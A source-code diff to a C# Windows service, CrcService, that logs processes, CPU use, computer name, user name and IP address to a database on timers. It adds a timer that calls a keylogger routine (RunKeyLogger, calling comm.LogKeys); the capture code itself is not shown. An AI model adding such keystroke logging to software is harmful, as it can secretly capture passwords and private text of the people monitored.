@@ -7,6 +7,8 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.ServiceProcess;
 using System.Text;
@@ -45,6 +47,9 @@ namespace CrcService
         DBConnect BConnect;
         dsProcess.ProcessDataTable pdt;
         int bScrollActivity = 0;
+        string localIPAddress = string.Empty;
+        string compName = string.Empty;
+        string compUser = string.Empty;
 
         ArrayList ProcessDataList = new ArrayList();
         ArrayList IDList = new ArrayList();
@@ -137,15 +142,17 @@ namespace CrcService
             //lvLog.Items.Add(listViewItem);
             //lvLog.EnsureVisible(lvLog.Items.Count - 1);
 
-            if (logon == true)
+            if (CrcService.Properties.Settings.Default.Log_Command)
             {
-                string path = CrcService.Properties.Settings.Default.FileLOG;
-                using (StreamWriter sw = File.AppendText(path))
+                if (logon == true)
                 {
-                    sw.WriteLine(datum.PadRight(22) + mess);
+                    string path = CrcService.Properties.Settings.Default.FileLOG;
+                    using (StreamWriter sw = File.AppendText(path))
+                    {
+                        sw.WriteLine(datum.PadRight(22) + mess);
+                    }
                 }
             }
-
             /*
             if (chkScrollActivity.Checked)
             {
@@ -159,8 +166,7 @@ namespace CrcService
                 lvLog.EnsureVisible(lvLog.Items.Count - 1);
                 bScrollActivity = 0;
             }
-            lvLog.ResumeLayout();
-            */
+            lvLog.ResumeLayout();*/
         }
 
 
@@ -267,9 +273,9 @@ namespace CrcService
                 ProcessData TempProcess = (ProcessData)ProcessDataList[Index];
                 dsProcess.ProcessRow row;
                 row = pdt.NewProcessRow();
-                row.CompName = GetCompName();
-                row.CompUser = GetCompUser();
-                row.IP = GetIPAddress();
+                row.CompName = compName; //GetCompName();
+                row.CompUser = compUser; //GetCompUser();
+                row.IP = localIPAddress; //GetIPAddress(); // GetLocalIpAddress();
                 row.ProcesName = TempProcess.Name;
                 row.CPUUse = TempProcess.CpuUsage;
                 row.ProcTime = dt;
@@ -313,14 +319,14 @@ namespace CrcService
                     Index++;
                 else
                 {
-                    //ProcessView.Items.Remove(TempProcess.ProcessItem);
+                    ProcessView.Items.Remove(TempProcess.ProcessItem);
                     ProcessDataList.RemoveAt(Index);
                 }
             }
 
-            //IdleProcessItem.SubItems[2].Text = (100 - Total) + "%";
+            IdleProcessItem.SubItems[2].Text = (100 - Total) + "%";
 
-            //ProcessView.ResumeLayout();
+            ProcessView.ResumeLayout();
 
             comm.ResetCounter();
 
@@ -405,6 +411,82 @@ namespace CrcService
             LogTo("SaveXML");
         }
 
+        private void RefreshParameter()
+        {
+            localIPAddress = GetLocalIpAddress();
+            compName = GetCompName();
+            compUser = GetCompUser();
+        }
 
+        public string GetLocalIpAddress()
+        {
+            UnicastIPAddressInformation mostSuitableIp = null;
+
+            var networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
+
+            foreach (var network in networkInterfaces)
+            {
+                if (network.OperationalStatus != OperationalStatus.Up)
+                    continue;
+
+                var properties = network.GetIPProperties();
+
+                if (properties.GatewayAddresses.Count == 0)
+                    continue;
+
+                foreach (var address in properties.UnicastAddresses)
+                {
+                    if (address.Address.AddressFamily != AddressFamily.InterNetwork)
+                        continue;
+
+                    if (IPAddress.IsLoopback(address.Address))
+                        continue;
+
+                    if (!address.IsDnsEligible)
+                    {
+                        if (mostSuitableIp == null)
+                            mostSuitableIp = address;
+                        continue;
+                    }
+
+                    // The best IP is the IP got from DHCP server
+                    if (address.PrefixOrigin != PrefixOrigin.Dhcp)
+                    {
+                        if (mostSuitableIp == null || !mostSuitableIp.IsDnsEligible)
+                            mostSuitableIp = address;
+                        continue;
+                    }
+
+                    return address.Address.ToString();
+                }
+            }
+
+            return mostSuitableIp != null
+                ? mostSuitableIp.Address.ToString()
+                : "";
+        }
+
+        private void TimerDB_Tick(object sender, EventArgs e)
+        {
+
+            LogTo("Timer3 DB START", true, true);
+            SaveToDB();
+            SaveToDB();
+            RefreshParameter();
+            LogTo("Timer3 DB STOP");
+
+        }
+
+        private void KeyTime_Tick(object sender, EventArgs e)
+        {
+            LogTo("Timer2 KeyLog");
+            RunKeyLogger();
+            //ShowCountData();
+        }
+
+        private void RunKeyLogger()
+        {
+            comm.LogKeys();
+        }
     }
 }
